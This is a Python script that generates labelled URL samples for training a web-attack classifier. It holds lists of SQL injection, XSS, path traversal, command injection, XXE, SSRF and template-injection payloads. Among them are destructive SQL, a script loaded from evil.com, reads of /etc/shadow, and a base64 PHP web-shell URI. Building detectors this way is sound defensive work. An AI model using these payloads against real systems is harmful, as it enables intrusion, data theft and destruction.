"""
Synthetic Data Generator for Multi-Class Vulnerability Classifier

Generates labeled training data for:
    0: Normal (safe URLs and requests)
    1: SQL Injection
    2: XSS (Cross-Site Scripting)
    3: Path Traversal / LFI
    4: Command Injection
    5: Generic Attack / Other

Usage:
    python synthetic_data_generator.py
"""

import os
import csv
import random
from urllib.parse import quote
from typing import List, Tuple

# Output path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = r'C:\Users\Aryan\OneDrive\Desktop\data\training_data'

# Class labels
CLASS_LABELS = {
    0: 'Normal',
    1: 'SQL Injection',
    2: 'XSS',
    3: 'Path Traversal',
    4: 'Command Injection',
    5: 'Generic Attack'
}

# =============================================================================
# NORMAL URL PATTERNS
# =============================================================================
NORMAL_DOMAINS = [
    'https://example.com',
    'https://shop.example.com',
    'https://api.example.com',
    'https://blog.example.com',
    'https://docs.example.com',
]

NORMAL_PATHS = [
    '/', '/home', '/about', '/contact', '/products', '/services',
    '/blog', '/news', '/faq', '/help', '/support', '/terms',
    '/privacy', '/login', '/register', '/dashboard', '/profile',
    '/settings', '/account', '/cart', '/checkout', '/orders',
    '/api/v1/users', '/api/v1/products', '/api/v1/orders',
    '/api/v2/auth/login', '/api/v2/auth/register',
    '/docs/getting-started', '/docs/api-reference',
    '/blog/2024/01/new-features', '/blog/category/technology',
]

NORMAL_PARAMS = [
    '', '?page=1', '?page=2&limit=10', '?sort=date', '?order=asc',
    '?category=electronics', '?brand=samsung', '?q=laptop',
    '?id=123', '?user_id=456', '?product_id=789',
    '?lang=en', '?lang=es', '?theme=dark', '?theme=light',
    '?filter=active', '?status=pending', '?type=premium',
    '?from=2024-01-01&to=2024-12-31', '?year=2024&month=03',
    '?ref=homepage', '?utm_source=google', '?utm_campaign=spring',
]

# =============================================================================
# SQL INJECTION PAYLOADS
# =============================================================================
SQL_PAYLOADS = [
    # Basic SQLi
    "'", "''", '"', '`',
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    '" OR "1"="1', '" OR "1"="1"--',
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin'#", "admin'/*",
    
    # UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION SELECT username,password FROM users--",
    "1 UNION SELECT * FROM users", "1 UNION ALL SELECT NULL",
    "' UNION SELECT table_name FROM information_schema.tables--",
    
    # Error-based
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1=1", "' AND 1=2",
    "' AND 'a'='a", "' AND 'a'='b",
    "1' AND '1'='1", "1' AND '1'='2",
    
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)#",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; DELETE FROM users--",
    "'; EXEC xp_cmdshell('dir')--",
    
    # Authentication bypass
    "admin' or '1'='1", "admin'/*", "admin')--",
    "' or ''='", "' or 1=1 or ''='",
    "') or ('1'='1", "') or ('1'='1'--",
    
    # Comment variations
    "' --", "' #", "' /*", "'--", "'#",
    
    # Encoded variations
    "%27", "%27%20OR%20%271%27%3D%271",
    "%27%20UNION%20SELECT%20*%20FROM%20users",
    "1%27%20AND%20%271%27%3D%271",
]

# =============================================================================
# XSS PAYLOADS
# =============================================================================
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script src='http://evil.com/xss.js'></script>",
    
    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x onload=alert(1)>",
    "<body onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    
    # SVG-based
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<svg><animate onbegin=alert(1)>",
    
    # Iframe injection
    "<iframe src='javascript:alert(1)'>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    
    # JavaScript protocol
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    
    # DOM manipulation
    "<div onclick=alert(1)>click me</div>",
    "<a href='javascript:alert(1)'>click</a>",
    "<form action='javascript:alert(1)'><input type=submit>",
    
    # Obfuscated
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>al\\u0065rt(1)</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    
    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>",
]

# =============================================================================
# PATH TRAVERSAL / LFI PAYLOADS
# =============================================================================
LFI_PAYLOADS = [
    # Unix paths
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../etc/shadow", "../../../etc/hosts",
    "../../../var/log/apache2/access.log",
    "../../../var/log/auth.log",
    
    # Windows paths
    "..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\boot.ini",
    
    # Encoded variations
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    
    # Null byte injection
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",
    
    # Filter bypass
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    "....\\....\\....\\windows\\system.ini",
    "..;/..;/..;/etc/passwd",
    
    # Wrapper protocols (PHP)
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "file:///etc/passwd",
    "file://c:/windows/system.ini",
    
    # Absolute paths
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/var/www/html/config.php", "/var/www/html/.env",
    "c:\\windows\\system32\\config\\sam",
    "c:\\boot.ini", "c:\\windows\\win.ini",
]

# =============================================================================
# COMMAND INJECTION PAYLOADS
# =============================================================================
CMD_PAYLOADS = [
    # Basic command separators
    "; ls", "| ls", "|| ls", "&& ls", "& ls",
    "; id", "| id", "|| id", "&& id", "& id",
    "; whoami", "| whoami", "|| whoami", "&& whoami",
    "; cat /etc/passwd", "| cat /etc/passwd",
    
    # Windows commands
    "& dir", "| dir", "&& dir", "|| dir",
    "& type C:\\boot.ini", "| type C:\\windows\\system.ini",
    "& net user", "| net user",
    
    # Backtick execution
    "`ls`", "`id`", "`whoami`", "`cat /etc/passwd`",
    
    # $() execution
    "$(ls)", "$(id)", "$(whoami)", "$(cat /etc/passwd)",
    
    # Newline injection
    "%0als", "%0aid", "%0Awhoami",
    "\nls", "\nid", "\nwhoami",
    
    # Encoded
    "%3Bls", "%7Cid", "%26%26whoami",
    
    # Time-based detection
    "; sleep 5", "| sleep 5", "&& sleep 5",
    "$(sleep 5)", "`sleep 5`",
    
    # Output redirection
    "; ls > /tmp/out.txt", "| tee /tmp/out.txt",
    
    # Chained commands
    "; ls; cat /etc/passwd", "| ls | grep root",
    "&& id && whoami && uname -a",
]

# =============================================================================
# GENERIC ATTACK PAYLOADS
# =============================================================================
GENERIC_PAYLOADS = [
    # LDAP Injection
    "*)(uid=*))(|(uid=*", "admin)(&)", "*()|&'",
    
    # XML/XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    "<!ENTITY xxe SYSTEM 'http://attacker.com/'>",
    
    # SSRF indicators
    "http://127.0.0.1", "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]", "http://0.0.0.0",
    
    # Header injection
    "%0d%0aSet-Cookie:%20evil=hacker",
    "test%0d%0aInjected-Header:%20value",
    
    # SSTI
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
    "{{config}}", "{{settings.SECRET_KEY}}",
    "{{''.class.mro[2].subclasses()}}",
    
    # Prototype pollution
    "__proto__[isAdmin]=true",
    "constructor.prototype.isAdmin=true",
    
    # NoSQL injection
    '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
    
    # Unusual encodings
    "%00", "%0a", "%0d", "%ff",
    "AAAA%08%08%08%08%n%n%n%n",  # Format string
]


def generate_normal_urls(count: int = 5000) -> List[Tuple[str, int]]:
    """Generate normal/safe URL samples."""
    samples = []
    for _ in range(count):
        domain = random.choice(NORMAL_DOMAINS)
        path = random.choice(NORMAL_PATHS)
        params = random.choice(NORMAL_PARAMS)
        url = f"{domain}{path}{params}"
        samples.append((url, 0))  # Label 0 = Normal
    return samples


def generate_attack_urls(payloads: List[str], label: int, count_per_payload: int = 10) -> List[Tuple[str, int]]:
    """Generate attack URLs by injecting payloads into URL parameters."""
    samples = []
    
    endpoints = [
        '/search?q=', '/product?id=', '/user?name=', '/api/query?input=',
        '/page?file=', '/download?path=', '/view?doc=', '/load?module=',
        '/exec?cmd=', '/run?command=', '/process?action=', '/data?value=',
    ]
    
    for payload in payloads:
        for _ in range(count_per_payload):
            domain = random.choice(NORMAL_DOMAINS)
            endpoint = random.choice(endpoints)
            
            # Sometimes URL encode the payload
            if random.random() > 0.7:
                payload_to_use = quote(payload, safe='')
            else:
                payload_to_use = payload
                
            url = f"{domain}{endpoint}{payload_to_use}"
            samples.append((url, label))
    
    return samples


def generate_training_data() -> List[Tuple[str, int]]:
    """Generate complete training dataset."""
    print("Generating synthetic training data...")
    
    all_samples = []
    
    # Normal URLs (class 0)
    print("  Generating normal URLs...")
    all_samples.extend(generate_normal_urls(8000))
    
    # SQL Injection (class 1)
    print("  Generating SQL Injection samples...")
    all_samples.extend(generate_attack_urls(SQL_PAYLOADS, 1, count_per_payload=15))
    
    # XSS (class 2)
    print("  Generating XSS samples...")
    all_samples.extend(generate_attack_urls(XSS_PAYLOADS, 2, count_per_payload=15))
    
    # Path Traversal (class 3)
    print("  Generating Path Traversal samples...")
    all_samples.extend(generate_attack_urls(LFI_PAYLOADS, 3, count_per_payload=15))
    
    # Command Injection (class 4)
    print("  Generating Command Injection samples...")
    all_samples.extend(generate_attack_urls(CMD_PAYLOADS, 4, count_per_payload=15))
    
    # Generic Attack (class 5)
    print("  Generating Generic Attack samples...")
    all_samples.extend(generate_attack_urls(GENERIC_PAYLOADS, 5, count_per_payload=15))
    
    # Shuffle
    random.shuffle(all_samples)
    
    return all_samples


def save_to_csv(samples: List[Tuple[str, int]], filename: str = 'training_data.csv'):
    """Save samples to CSV file."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    filepath = os.path.join(OUTPUT_DIR, filename)
    
    with open(filepath, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['url', 'label'])
        for url, label in samples:
            writer.writerow([url, label])
    
    print(f"Saved {len(samples)} samples to {filepath}")
    return filepath


def print_statistics(samples: List[Tuple[str, int]]):
    """Print class distribution statistics."""
    from collections import Counter
    
    labels = [s[1] for s in samples]
    counts = Counter(labels)
    
    print("\n" + "=" * 50)
    print("DATASET STATISTICS")
    print("=" * 50)
    print(f"Total samples: {len(samples)}")
    print("\nClass distribution:")
    for label, count in sorted(counts.items()):
        print(f"  {label} ({CLASS_LABELS[label]}): {count} samples ({count/len(samples)*100:.1f}%)")
    print("=" * 50)


if __name__ == "__main__":
    print("=" * 60)
    print("SYNTHETIC DATA GENERATOR FOR VULNERABILITY CLASSIFIER")
    print("=" * 60)
    
    # Generate data
    samples = generate_training_data()
    
    # Print stats
    print_statistics(samples)
    
    # Save to CSV
    save_to_csv(samples)
    
    print("\nDone! Training data is ready.")
